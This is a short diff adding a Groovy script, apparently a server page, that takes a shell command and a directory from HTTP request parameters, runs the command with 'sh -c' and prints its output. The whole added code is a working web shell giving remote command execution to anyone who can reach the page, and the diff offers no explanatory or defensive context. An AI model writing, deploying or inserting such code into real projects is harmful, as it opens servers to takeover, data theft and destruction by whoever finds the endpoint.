@@ -1,0 +1,7 @@
+dir=request.getParameter("dir")
+cmd=request.getParameter("command")
+if(!dir) dir="."
+p=['sh', '-c', cmd].execute(null, new java.io.File(dir))
+
+
+print p.text
